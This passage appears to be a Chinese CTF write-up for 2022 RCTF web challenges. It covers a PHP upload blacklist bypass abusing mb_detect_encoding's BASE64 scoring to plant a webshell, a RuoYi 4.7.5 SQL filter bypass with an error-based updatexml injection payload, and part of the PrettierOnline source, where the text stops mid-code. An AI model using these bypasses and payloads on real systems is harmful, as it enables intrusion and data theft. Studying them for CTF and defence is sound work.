<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_detect_encoding</span>(<span class="keyword">string</span> <span class="variable">$string</span>, <span class="keyword">array</span>|<span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$encodings</span> = <span class="literal">null</span>, <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">false</span>): <span class="keyword">string</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p><code>$strict</code>控制在列出的任何编码中字符串无效时的行为。如果<code>strict</code>设置为<code>false</code>，则返回最接近的匹配编码;如果<code>strict</code>设置为<code>true</code>，则返回<code>false</code>。</p>
<p>当<code>$encodings</code>省略或者为空时，会从<code>mb_detect_order()</code>中按顺序进行测试</p>
<p>该题代码中为<code>mb_detect_order([&quot;BASE64&quot;,&quot;ASCII&quot;,&quot;UTF-8&quot;]);</code></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">           <span class="variable">$charset</span> = <span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$content</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">           <span class="keyword">if</span>(<span class="literal">false</span> !== <span class="variable">$charset</span>)&#123;</span><br><span class="line">               <span class="keyword">if</span>(<span class="variable">$charset</span> == <span class="string">&quot;BASE64&quot;</span>)&#123;</span><br><span class="line">                   <span class="variable">$content</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$content</span>);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;content_blacklist <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">                   <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>, <span class="variable">$v</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">                       <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking <span class="subst">$v</span> .&quot;</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking invalid format.&quot;</span>);</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>

<p>这段代码的判断主要是有个<code>charset</code>的判断, 如果 <code>mb_detect_encoding()</code> 的结果不为空【<code>false !== $charset</code>】, 就会对文件内容进行判断，而当为空时【<code>false == $charset</code>】，就会直接返回退出</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$charset</span> == <span class="string">&quot;BASE64&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;content_blacklist <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>, <span class="variable">$v</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking <span class="subst">$v</span> .&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而且在这段代码中有显示，不仅需要<code>$charset</code>不为空，还需要<code>$charset==&quot;BASE64&quot;</code></p>
<p>判断完<code>$charset</code>后，又对内容进行正则匹配，如果出现，就会失败了，所以需要在</p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230122163200935.png"><img src="/2022RCTF/image-20230122163200935.png" alt="image-20230122163200935"></a></p>
<p>这里匹配内容的代码为<code>stristr($content, $v)!==false</code></p>
<p><strong>stristr</strong></p>
</blockquote>
<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<p><code>https://github.com/php/php-src/issues/9008</code></p>
<p>它会导致奇怪的结果。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;PHP&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mb_detect_order</span>([<span class="string">&quot;ASCII&quot;</span>,<span class="string">&quot;UTF-8&quot;</span>,<span class="string">&quot;BASE64&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(</span><br><span class="line"><span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$string</span>, <span class="literal">null</span>, <span class="literal">true</span>),</span><br><span class="line"><span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$string</span>, <span class="title function_ invoke__">mb_detect_order</span>(), <span class="literal">true</span>),</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mb_convert_encoding</span>(<span class="variable">$string</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;BASE64&quot;</span>),</span><br><span class="line"><span class="title function_ invoke__">mb_strtolower</span>(<span class="variable">$string</span>, <span class="string">&quot;BASE64&quot;</span>),</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>得到的结果发现</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Output for <span class="number">8.2</span><span class="number">.0</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br><span class="line"></span><br><span class="line">Output for <span class="number">8.0</span><span class="number">.1</span> - <span class="number">8.0</span><span class="number">.26</span><span class="punctuation">,</span> <span class="number">8.1</span><span class="number">.10</span> - <span class="number">8.1</span><span class="number">.13</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br><span class="line"></span><br><span class="line">Output for <span class="number">8.1</span><span class="number">.0</span> - <span class="number">8.1</span><span class="number">.9</span></span><br><span class="line">string(<span class="number">6</span>) <span class="string">&quot;BASE64&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br></pre></td></tr></table></figure>

<p><code>mb_detect_encoding($string, null, true)</code>返回值</p>
<p>只有在<code>PHP</code>版本在<code>8.1.0 - 8.1.9</code>时会返回<code>base64</code>，而在其他版本都是默认识别为<code>ASCII</code></p>
<p>查看返回包中数据可知</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 22 Jan 2023 08:40:35 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache/2.4.54 (Debian)</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/8.1.9</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>14</span><br></pre></td></tr></table></figure>

<p>正好是<code>8.1.0 - 8.1.9</code>版本</p>
</blockquote>
<h4 id="libmbfl打分"><a href="#libmbfl打分" class="headerlink" title="libmbfl打分"></a>libmbfl打分</h4><blockquote>
<p>所以实现&#96;&#96;$charset &#x3D;&#x3D; BASE64&#96;，只要文件内容前面数据让它识别为base64即可</p>
<p>那么如何让其认为是base64呢？</p>
<p>这就涉及到<code>libmbfl</code>的打分，<code>libmbfl</code>是<code>mb</code>扩展</p>
<p><code>https://github.com/php/php-src/blob/master/ext/mbstring/libmbfl/mbfl/mbfilter.c#L225</code></p>
<p>我的理解就是类似像<code>checkengine</code>，比如<code>mb_detect_encoding()</code>这类的函数对内容进行编码的识别，就是<code>匹配内容中的一些符合编码的字符，匹配成功对应编码加分</code>，最后从头到尾匹配完成后，<code>打分最高的编码就被认为是该内容的编码</code></p>
</blockquote>
<p>这是打分判断</p>
<blockquote>
<p>0xFFFF是-1，&gt;&#x3D;0 </p>
<blockquote>
<p>0x21是33 33对应!</p>
<p>0x2F是47 47对应&#x2F;</p>
<p><code>47&gt;=c&gt;=33</code></p>
</blockquote>
<p><code>/</code>打分打的多，所以可以在一句话🐎前加入许多<code>/</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230122195735469.png"><img src="/2022RCTF/image-20230122195735469.png" alt="image-20230122195735469"></a></p>
<p>这是<code>mb_encoding_detect()</code>返回判断得到编码类型的逻辑</p>
<blockquote>
<p>因为<code>mb_detect_order([&quot;BASE64&quot;,&quot;ASCII&quot;,&quot;UTF-8&quot;]);</code>，所以按照得分匹配，如果是想要返回<code>base64</code>，就需要内容中<code>base64</code>得分最高，才可以实现返回为<code>base64</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230122195835984.png"><img src="/2022RCTF/image-20230122195835984.png" alt="image-20230122195835984"></a></p>
<h3 id="综上"><a href="#综上" class="headerlink" title="综上"></a><strong>综上</strong></h3><blockquote>
<p>上传的文件需要满足</p>
<p>1.后缀不能为<code>.php</code>等，可以为大小写混写或者纯大写，如<code>.pHp，.PHP</code>等等</p>
<p>2.文件内容前面需要可以被识别为<code>base64</code>，而后面的过滤的内容其实就不用考虑了，因为在判断前经过</p>
<p><code>$content=base64_decode($content)</code></p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230122213729640.png"><img src="/2022RCTF/image-20230122213729640.png" alt="image-20230122213729640"></a></p>
<p>可以发现原来的内容在被解码后，发生了变化，结果转化为乱码，于是绕过了黑名单过滤</p>
<p>【当然前提是<code>$charset == BASE64</code>，也就是打分够了】</p>
</blockquote>
<p>于是最后的文件内容为</p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230122210900608.png"><img src="/2022RCTF/image-20230122210900608.png" alt="image-20230122210900608"></a></p>
<p>访问<code>1.PHP</code></p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230122210957493.png"><img src="/2022RCTF/image-20230122210957493.png" alt="image-20230122210957493"></a></p>
<p>拿蚁剑连接</p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230122164102078.png"><img src="/2022RCTF/image-20230122164102078.png" alt="image-20230122164102078"></a></p>
<p>最后得到<code>flag</code></p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230122164115830.png"><img src="/2022RCTF/image-20230122164115830.png" alt="image-20230122164115830"></a></p>
<h2 id="ezruoyi"><a href="#ezruoyi" class="headerlink" title="ezruoyi"></a>ezruoyi</h2><blockquote>
<p>hint:<code>RuoYi v4.7.5</code></p>
</blockquote>
<blockquote>
<p>附件：</p>
<p><code>https://drive.google.com/file/d/1vd8-tzGCX5Nra2vNTvJerjyW4KQDaAtE/view?usp=sharing</code></p>
<p>or</p>
<p><code>https://share.weiyun.com/wCvo3QJ0</code></p>
</blockquote>
<hr>
<blockquote>
<p>什么是RuoYi？</p>
<p>RuoYi是一个 <strong>Java EE 企业级快速开发平台</strong>，基于经典技术组合（Spring Boot、Apache Shiro、MyBatis、Thymeleaf、Bootstrap），内置模块如：部门管理、角色用户、菜单及按钮授权、数据权限、系统参数、日志管理、通知公告等。</p>
</blockquote>
<p>这个<code>ruoyi v4.75是</code>一个0day题目</p>
<p>搭建本地环境有问题，只有看看源码和师傅们的wp总结一下</p>
<hr>
<p>先进行信息收集，根据hint，查找ruoyiv 4.75以及其之前的常出现的漏洞点</p>
<p><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/1256773.html">https://cn-sec.com/archives/1256773.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/304666.html">https://www.freebuf.com/articles/web/304666.html</a></p>
<p>这两篇文章提到<code>Ruoyi&lt;=4.6.1</code>存在后台sql注入漏洞</p>
<p>对<code>ruoyi-admin.jar</code>包进行查找，</p>
<p>在 <code>ruoyi-generator-4.7.5.jar</code>找到<code>GenTablrServiceImpl.class</code></p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230304225854115.png"><img src="/2022RCTF/image-20230304225854115.png" alt="image-20230304225854115"></a></p>
<p>其中的sql语句为</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> AjaxResult <span class="title function_">create</span><span class="params">(String sql)</span> &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    SqlUtil.filterKeyword(sql);</span><br><span class="line">    List&lt;SQLStatement&gt; sqlStatements = SQLUtils.parseStatements(sql, DbType.mysql);</span><br><span class="line">    List&lt;String&gt; tableNames = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (SQLStatement sqlStatement : sqlStatements) &#123;</span><br><span class="line">      <span class="keyword">if</span> (sqlStatement <span class="keyword">instanceof</span> MySqlCreateTableStatement) &#123;</span><br><span class="line">        <span class="type">MySqlCreateTableStatement</span> <span class="variable">createTableStatement</span> <span class="operator">=</span> (MySqlCreateTableStatement)sqlStatement;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.genTableService.createTable(createTableStatement.toString())) &#123;</span><br><span class="line">          <span class="type">String</span> <span class="variable">tableName</span> <span class="operator">=</span> createTableStatement.getTableName().replaceAll(<span class="string">&quot;`&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">          tableNames.add(tableName);</span><br><span class="line">        &#125; </span><br><span class="line">      &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    List&lt;GenTable&gt; tableList = <span class="built_in">this</span>.genTableService.selectDbTableListByNames(tableNames.&lt;String&gt;toArray(<span class="keyword">new</span> <span class="title class_">String</span>[tableNames.size()]));</span><br><span class="line">    <span class="type">String</span> <span class="variable">operName</span> <span class="operator">=</span> Convert.toStr(PermissionUtils.getPrincipalProperty(<span class="string">&quot;loginName&quot;</span>));</span><br><span class="line">    <span class="built_in">this</span>.genTableService.importGenTable(tableList, operName);</span><br><span class="line">    <span class="keyword">return</span> AjaxResult.success();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    <span class="built_in">this</span>.logger.error(e.getMessage(), e);</span><br><span class="line">    <span class="keyword">return</span> AjaxResult.error(<span class="string">&quot;创建表结构异常[&quot;</span> + e.getMessage() + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现sql注入过滤判断，跟进<code>SqlUtil</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlUtil.filterKeyword(sql);</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ruoyi.common.utils.sql;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ruoyi.common.exception.UtilException;</span><br><span class="line"><span class="keyword">import</span> com.ruoyi.common.utils.StringUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlUtil</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">SQL_REGEX</span> <span class="operator">=</span> <span class="string">&quot;select |insert |delete |update |drop |count |exec |chr |mid |master |truncate |char |and |declare &quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">SQL_PATTERN</span> <span class="operator">=</span> <span class="string">&quot;[a-zA-Z0-9_\\ \\,\\.]+&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">escapeOrderBySql</span><span class="params">(String value)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isNotEmpty(value) &amp;&amp; !isValidOrderBySql(value))</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UtilException</span>(<span class="string">&quot;); </span></span><br><span class="line"><span class="string">    return value;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  public static boolean isValidOrderBySql(String value) &#123;</span></span><br><span class="line"><span class="string">    return value.matches(SQL_PATTERN);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  public static void filterKeyword(String value) &#123;</span></span><br><span class="line"><span class="string">    if (StringUtils.isEmpty(value))</span></span><br><span class="line"><span class="string">      return; </span></span><br><span class="line"><span class="string">    String[] sqlKeywords = StringUtils.split(SQL_REGEX, &quot;</span>\\|<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    for (String sqlKeyword : sqlKeywords) &#123;</span></span><br><span class="line"><span class="string">      if (StringUtils.indexOfIgnoreCase(value, sqlKeyword) &gt; -1)</span></span><br><span class="line"><span class="string">        throw new UtilException(&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到正则过滤了很多</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">SQL_REGEX</span> <span class="operator">=</span> <span class="string">&quot;select |insert |delete |update |drop |count |exec |chr |mid |master |truncate |char |and |declare &quot;</span>;</span><br></pre></td></tr></table></figure>

<p>开始还以为直接堵死了，但是它实际过滤的是<code>select_(空格)</code>，而非过滤了select，用<code>select/**/</code>可以进行绕过</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/y_project/RuoYi/pulls/403">https://gitee.com/y_project/RuoYi/pulls/403</a></p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230305002520151.png"><img src="/2022RCTF/image-20230305002520151.png" alt="image-20230305002520151"></a></p>
<p>在其<code>master</code>分支进行了<code>pull request</code>，对此处进行了修改，但是在main分支仍然存在旧代码的漏洞，所以仍然是可以利用的</p>
<p>而且分析前面方法</p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlStatement <span class="keyword">instanceof</span> MySqlCreateTableStatement</span><br></pre></td></tr></table></figure>

<p>知道该方法是在<strong>create</strong>的时候触发，会先进行解析sql语句，然后进行创建表，如果创建表成功，则将表名添加到列表中</p>
<p>那么在一个创建表的sql语句中我们如何让它回显出我们需要的内容呢，</p>
<p>关键就在这里抛出异常</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      <span class="built_in">this</span>.logger.error(e.getMessage(), e);</span><br><span class="line">      <span class="keyword">return</span> AjaxResult.error(<span class="string">&quot;创建表结构异常[&quot;</span> + e.getMessage() + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>

<p>所以构造一个报错的表，且让其中包含flag数据</p>
<p>&#x3D;&gt;用报错注入查询flag的数据，然后把数据导入到创建的新表中去</p>
<p>所以于是根据构造</p>
<p>在网站<code>/tool/gen/createTable</code>以<code>post</code>方式提交<code>sql</code>语句</p>
<p>【注意表名不能和数据库已经有的表名相同否则会创建表失败】</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">sql</span><span class="operator">=</span><span class="keyword">create</span> <span class="keyword">table</span> a <span class="keyword">as</span> <span class="keyword">select</span><span class="comment">/**/</span>updatexml(<span class="number">0x7e</span>,(<span class="keyword">select</span><span class="comment">/**/</span>flag <span class="keyword">from</span> flag),<span class="number">0x7e</span>)</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230305005514205.png"><img src="/2022RCTF/image-20230305005514205.png" alt="image-20230305005514205"></a></p>
<h2 id="PrettierOnline"><a href="#PrettierOnline" class="headerlink" title="PrettierOnline"></a>PrettierOnline</h2><blockquote>
<p>hint:<code>Prettier my(not your) code</code></p>
<p>附件：<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/media/file/task/edc2b784-4b87-4b94-800f-1dc4fc61060e.tar">https://adworld.xctf.org.cn/media/file/task/edc2b784-4b87-4b94-800f-1dc4fc61060e.tar</a></p>
</blockquote>
<blockquote>
<p>什么是Prettier？</p>
<p>一个“有态度”的<a target="_blank" rel="noopener" href="https://www.prettier.cn/">代码格式化工具</a></p>
</blockquote>
<p>这个环境也有点问题，虽然能够完成搭建并且访问，但是调用<code>Prettier</code>时，对于身份的验证一直提示</p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230217204716995.png"><img src="/2022RCTF/image-20230217204716995.png" alt="image-20230217204716995"></a></p>
<p>猜测是不是<code>Prettier</code>官方对公开可调用api进行了修改，导致在此题容器中无法运行<code>Prettier</code></p>
<p>只能记一下其他师傅的wp的知识点了【下次一定要现场搞出来，事后搞确实烦人</p>
<hr>
<p>这个题的思路有点头疼</p>
<p>这是官方配置文件介绍<a target="_blank" rel="noopener" href="https://prettier.io/docs/en/configuration.html">https://prettier.io/docs/en/configuration.html</a></p>
<p>先看看环境文件，之前没学过<code>node.js</code>这次学习一下</p>
<h3 id="index-js"><a href="#index-js" class="headerlink" title="index.js"></a><code>index.js</code></h3><p>分析加在注释</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入文件系统、加密、格式化工具、进程控制等模块</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> prettier = <span class="built_in">require</span>(<span class="string">&#x27;prettier&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; nextTick, exit &#125; = <span class="built_in">require</span>(<span class="string">&#x27;process&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入自定义的 fw 模块</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;./fw&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从文件 ./dist/id 中读取一个字符串，然后使用 trim() 方法去除两端的空格</span></span><br><span class="line"><span class="keyword">const</span> id = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./dist/id&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>).<span class="title function_">toString</span>(<span class="string">&#x27;utf-8&#x27;</span>).<span class="title function_">trim</span>()</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 删除文件 ./dist/id</span></span><br><span class="line">fs.<span class="title function_">unlinkSync</span>(<span class="string">&#x27;./dist/id&#x27;</span>)</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 调用 prettier.resolveConfig 方法，异步地读取和解析 .prettierrc 配置文件，然后使用该配置文件格式化代码</span></span><br><span class="line"><span class="comment">//$&#123;__dirname&#125;是node.js的一个特殊变量，用于读取当前模块所在的目录的绝对路径</span></span><br><span class="line">prettier.<span class="title function_">resolveConfig</span>(<span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/.prettierrc`</span>).<span class="title function_">then</span>(<span class="function"><span class="params">config</span> =&gt;</span> &#123;</span><br><span class="line">    </span><br><span class="line">   <span class="comment">// 格式化当前文件的代码</span></span><br><span class="line">  <span class="keyword">const</span> ret = prettier.<span class="title function_">format</span>(fs.<span class="title function_">readFileSync</span>(__filename, <span class="string">&#x27;utf-8&#x27;</span>), config)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 使用 SHA256 算法计算 id 的哈希值，并以十六进制格式输出为字符串</span></span><br><span class="line">  <span class="keyword">const</span> o = crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;sha256&#x27;</span>).<span class="title function_">update</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(id, <span class="string">&#x27;utf-8&#x27;</span>)).<span class="title function_">digest</span>().<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">   <span class="comment">// 将 id 作为文件名写入 dist 目录下</span></span><br><span class="line">  fs.<span class="title function_">writeFileSync</span>(<span class="string">`./dist/<span class="subst">$&#123;id&#125;</span>`</span>, o, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">   <span class="comment">// 将格式化后的代码写入文件 ./dist/ret.js 中</span></span><br><span class="line">  fs.<span class="title function_">writeFileSync</span>(<span class="string">&#x27;./dist/ret.js&#x27;</span>, ret, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">  <span 